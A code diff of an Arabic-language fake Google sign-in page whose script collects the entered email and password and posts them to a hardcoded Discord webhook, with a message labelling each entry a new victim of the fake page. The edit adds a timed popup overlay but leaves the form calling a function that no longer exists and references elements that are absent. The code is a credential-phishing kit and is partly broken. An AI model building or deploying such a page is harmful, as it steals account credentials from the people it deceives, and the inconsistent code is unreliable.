@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -6,10 +5,8 @@
   <title>تسجيل الدخول - حساب Google</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
+      font-family: Arial, sans-serif;
       background-color: #f2f2f2;
-      font-family: 'Roboto', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -17,80 +14,84 @@
       direction: rtl;
     }
 
-    .login-container {
-      background-color: #fff;
-      padding: 40px 30px;
-      border-radius: 8px;
-      box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.1);
-      width: 360px;
+    .popup {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
       text-align: center;
+      display: none;
     }
 
-    .login-container img {
-      width: 75px;
-      margin-bottom: 20px;
-    }
+    .popup img {
+ }
 
     .login-container h2 {
+       width: 90px;
       margin-bottom: 10px;
-      font-size: 20px;
-      color: #202124;
     }
 
-    .login-container input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
+    .popup input {
+      width: 90%;
+      padding: 8px;
+      margin: 5px 0;
       border: 1px solid #ccc;
       border-radius: 4px;
-      box-sizing: border-box;
-      font-size: 14px;
     }
 
-    .login-container button {
-      width: 100%;
-      padding: 12px;
-      background-color: #1a73e8;
+    .popup button {
+      padding: 10px 20px;
       border: none;
+      background: #1a73e8;
       color: white;
-      font-weight: bold;
-      border-radius: 4px;
       cursor: pointer;
-      font-size: 15px;
+      border-radius: 4px;
       margin-top: 10px;
     }
 
-    .login-container p {
-      font-size: 12px;
-      color: #5f6368;
-      margin-top: 20px;
+    #overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
     }
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo">
-    <h2>تسجيل الدخول إلى حسابك في Google</h2>
+
+<div id="login-container">
+   <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo">
+  <h2>تسجيل الدخول إلى حسابك في Google</h2>
+    
     <form onsubmit="sendToDiscord(); return false;">
-      <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-      <input type="password" id="password" placeholder="كلمة المرور" required>
+    
+       <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+  <input type="password" id="password" placeholder="كلمة المرور" required>
       <button type="submit">التالي</button>
-    </form>
-    <p>ليس جهاز الكمبيوتر هذا؟ استخدم وضع التصفح المتخفي لتسجيل الدخول.</p>
-  </div>
+     </form>
+   <p>ليس جهاز الكمبيوتر هذا؟ استخدم وضع التصفح المتخفي لتسجيل الدخول.</p>
+</div>
 
-  <script>
-    function sendToDiscord() {
-      var email = document.getElementById("email").value;
-      var password = document.getElementById("password").value;
+<script>
+  // إظهار النافذة بعد 1 ثانية
+  setTimeout(() => {
+    document.getElementById("overlay").style.display = "flex";
+    document.getElementById("loginPopup").style.display = "block";
+  }, 1000);
 
-      var webhookURL = "https://discordapp.com/api/webhooks/1399397276287238214/7ewH5rbPYRfX4HW2o5ano6PG48nJvEO6YsQvjMc5hxP21cuKVz9wl-zhlyaE-CVJJk-J";
+  function login() {
+    let email = document.getElementById("email").value;
+    let password = document.getElementById("password").value;
 
-      var payload = {
-        content: `📥 ضحية جديدة على صفحة Google وهمية:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`
-      };
-
-      fetch(webhookURL, {
+ var webhookURL = "https://discordapp.com/api/webhooks/1399397276287238214/7ewH5rbPYRfX4HW2o5ano6PG48nJvEO6YsQvjMc5hxP21cuKVz9wl-zhlyaE-CVJJk-J";
+       var payload = {
+          content: `📥 ضحية جديدة على صفحة Google وهمية:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`
+         };
+     fetch(webhookURL, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -103,5 +104,5 @@
       });
     }
   </script>
-</body>
-</html>
+   </body>
+   </html>
